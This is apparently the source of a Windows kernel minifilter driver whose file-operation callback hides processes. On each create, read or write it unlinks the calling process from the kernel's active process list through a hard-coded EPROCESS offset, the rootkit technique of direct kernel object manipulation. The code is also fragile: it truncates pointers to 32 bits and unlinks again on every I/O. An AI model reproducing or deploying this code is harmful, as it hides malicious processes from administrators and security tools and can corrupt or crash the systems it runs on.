#include <ntifs.h>
#include <ntddk.h>
#include <fltKernel.h>

#pragma prefast(disable:__WARNING_ENCODE_MEMBER_FUNCTION_POINTER, "No PREfast for minifilter drivers")  

extern "C" NTSTATUS NTAPI DriverEntry
	(__in PDRIVER_OBJECT pDriverObject, 
	 __in PUNICODE_STRING pRegistryPath);
extern "C" VOID NTAPI FilterUnload
	(__in PDRIVER_OBJECT pDriverObject);
extern "C" FLT_PREOP_CALLBACK_STATUS NTAPI PreOp
	(__inout PFLT_CALLBACK_DATA CallbackData, 
	 __in PCFLT_RELATED_OBJECTS FltObjects, 
	 __deref_out_opt PVOID *CompletionContext);
extern "C" VOID CheckForHook
	(__in PLIST_ENTRY pList);

#ifdef ALLOC_PRAGMA
#pragma alloc_text(INIT, DriverEntry)
#pragma alloc_text(PAGE, FilterUnload)
#endif

typedef struct S{

	PDRIVER_OBJECT DriverObject;
	PFLT_FILTER filter;

}S, *PS;

S s;

const _FLT_CONTEXT_REGISTRATION ContextRegistration[] = {

    { FLT_STREAMHANDLE_CONTEXT, 0, NULL, MAXUSHORT, 'dump' },
    { FLT_CONTEXT_END }

};

const _FLT_OPERATION_REGISTRATION  OperationRegistration[] = {

	{ IRP_MJ_CREATE, 0, PreOp, 0 },
    { IRP_MJ_WRITE, 0, PreOp, 0 },
    { IRP_MJ_READ, 0, PreOp, 0 },
    { IRP_MJ_OPERATION_END }
	
};

const _FLT_REGISTRATION FilterRegistration = {

    sizeof(FLT_REGISTRATION),         
    FLT_REGISTRATION_VERSION,           
    0,                                   
    ContextRegistration,                 
    OperationRegistration,                         
    (PFLT_FILTER_UNLOAD_CALLBACK)FilterUnload,                                    
    NULL, NULL, NULL, NULL, NULL, NULL, NULL       

};

extern "C" NTSTATUS NTAPI DriverEntry
	(__in PDRIVER_OBJECT pDriverObject, 
	 __in PUNICODE_STRING pRegistryPath) {

		 DbgPrint("DriverEntry\n");

         NTSTATUS ntstatus = FltRegisterFilter(pDriverObject, 
			 &FilterRegistration, &s.filter);

		 ntstatus = FltStartFiltering(s.filter);
		 return ntstatus; }

extern "C" VOID NTAPI FilterUnload
	(__in PDRIVER_OBJECT pDriverObject) {

		PAGED_CODE();
		DbgPrint("Unloaded!\n"); FltUnregisterFilter(s.filter); }

extern "C" FLT_PREOP_CALLBACK_STATUS NTAPI PreOp
	(__inout PFLT_CALLBACK_DATA CallbackData, 
	 __in PCFLT_RELATED_OBJECTS FltObjects, 
	 __deref_out_opt PVOID *CompletionContext) {

		PEPROCESS eprocAdd; DbgPrint("In preOp\n");
		PEPROCESS pProc = IoThreadToProcess(CallbackData->Thread);
		HANDLE hpID = PsGetProcessId(pProc);
		NTSTATUS ntstatus = PsLookupProcessByProcessId(hpID, &eprocAdd); 
		if (!NT_SUCCESS(ntstatus)) {
			DbgPrint("I cannot find the EPROCESS address!\n"); }
		ULONG eprocAddcs = (ULONG)eprocAdd;
		__try {
		PLIST_ENTRY pList = (PLIST_ENTRY)(eprocAddcs + 0x00b8); 
		RemoveEntryList(pList);
		/* *((ULONG *)pList->Blink) =  (ULONG)pList->Flink; 
		*((ULONG *)pList->Flink+1) = (ULONG)pList->Blink; 
		pList->Blink = (PLIST_ENTRY)&pList->Flink;
		pList->Flink = (PLIST_ENTRY)&pList->Flink; */ 
		//DbgPrint("Looking for hook!\n");
		/*CheckForHook(pList);*/ } __except(EXCEPTION_EXECUTE_HANDLER) {
			NTSTATUS ex = GetExceptionCode(); DbgPrint("Exception code: %d\n", ex);
		    return FLT_PREOP_SUCCESS_NO_CALLBACK; }
		DbgPrint("Done!\n");
		return FLT_PREOP_SUCCESS_WITH_CALLBACK;

}



















